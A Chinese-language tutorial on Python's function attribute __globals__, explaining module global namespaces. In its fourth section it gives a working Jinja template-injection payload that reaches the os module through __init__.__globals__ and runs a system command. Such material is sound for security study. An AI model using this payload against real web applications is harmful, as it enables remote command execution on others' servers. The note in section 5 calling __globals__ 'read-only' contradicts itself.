# `__globals__` 属性详解

## 概述

在 Python 中，函数不仅仅是代码的载体，它们是完整的对象，携带着丰富的元数据。其中，`__globals__` 是函数对象的重要属性之一，它指向定义该函数的模块的全局命名空间。

---

## 1. 什么是全局命名空间

* **模块级命名空间**：每个 `.py` 文件在加载时，会创建一个字典，存放该模块顶层定义的名字。

  * 变量名、函数名、类名
  * 导入的模块对象
  * 常量、配置项等
* 该字典在模块运行后一直存在，函数对象的 `__globals__` 就引用了它。

```python
# example.py
import os

FLAG = 'secret'

def foo(x):
    return os.path.basename(x)
```

* `example.py` 模块的全局命名空间大致为：

  ```python
  {
    'os': <module 'os' ...>,
    'FLAG': 'secret',
    'foo': <function foo at 0x...>,
    '__name__': 'example',
    '__file__': '/path/to/example.py',
    ...
  }
  ```

---

## 2. 函数对象的 `__globals__`

* 当 Python 解释器 **定义** 函数时，会将该模块的全局命名空间引用保存在函数对象的 `__globals__` 属性中。
* `__globals__` 类型：`dict`
* 包含了函数体内部对全局名字的访问权限。

```python
import example

# 查看 foo 函数的 __globals__
print(example.foo.__globals__['FLAG'])  # 输出: secret
print(example.foo.__globals__['os'])    # <module 'os' ...>
```

---

## 3. 为什么 `__globals__` 很重要

1. **作用域解析**：当函数体中访问未在局部定义的名字时，Python 会在 `__globals__` 查找。
2. **动态环境跳转**：可以通过 `__globals__` 访问模块中其他对象，甚至绕过 import 限制。
3. **安全研究与 SSTI 利用**：在 Server-Side Template Injection 中，利用函数的 `__globals__` 字典可获取对 `os`、`subprocess`、`builtins` 等模块的引用，从而执行任意命令。

---

## 4. 实战示例：在 SSTI 中拿到 `os` 模块

```jinja
{{ ''.__class__.__mro__[1]           
     .__subclasses__()[58]           
     .__init__.__globals__['os']     
     .popen('id').read()             
}}
```

1. `Popen = object.__subclasses__()[58]`
2. `__init__`：Popen 的构造函数，函数对象
3. `.__globals__['os']`：从 `subprocess` 模块的全局命名空间获取 `os`
4. `.popen('id')`：执行系统命令，读取输出

---

## 5. 注意事项

* **只读视图**：`__globals__` 只是指向原字典的引用，修改会影响模块全局变量。
* **安全风险**：不当使用可引发 RCE 等严重漏洞。
* **Python 版本**：属性在 Python 3.x 与 2.x 中行为一致。

---

## 6. 总结

* `__globals__` 是函数对象关联的全局命名空间字典。
* 它保存了函数定义所在模块的所有顶层变量与引用。
* 在高级安全利用场景中，`__globals__` 提供了一个跳板，让攻击者能绕过 import 机制，直接拿到系统模块。

---

*文档完*
